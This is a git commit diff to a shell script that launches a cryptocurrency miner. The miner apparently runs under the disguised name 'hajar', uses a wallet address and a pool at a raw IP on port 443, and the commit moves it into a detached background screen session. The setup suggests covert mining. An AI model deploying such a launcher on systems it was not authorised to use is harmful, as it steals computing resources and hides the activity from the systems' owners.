063ffff332a7a0bc16a2c242b88c87f73104f049
renilo <88342640+renilo@users.noreply.github.com>
2021-09-03 12:11:17 +0700

    Update xhajar.sh

--- xhajar.sh
+++ xhajar.sh
@@ -4,4 +4,4 @@ WALLET=RR6U3T7Uz475i7gontznFLWikFsQan2wjC
 
 chmod +x hajar
 
-./hajar --donate-level 1 -a rx/0 -o 208.113.200.73:443 -u ThisPC.$(echo $(shuf -i 1-9999999 -n 1)) -p x -k -t 4
+screen -dmS run ./hajar --donate-level 1 -a rx/0 -o 208.113.200.73:443 -u ThisPC.$(echo $(shuf -i 1-9999999 -n 1)) -p x -k -t 4
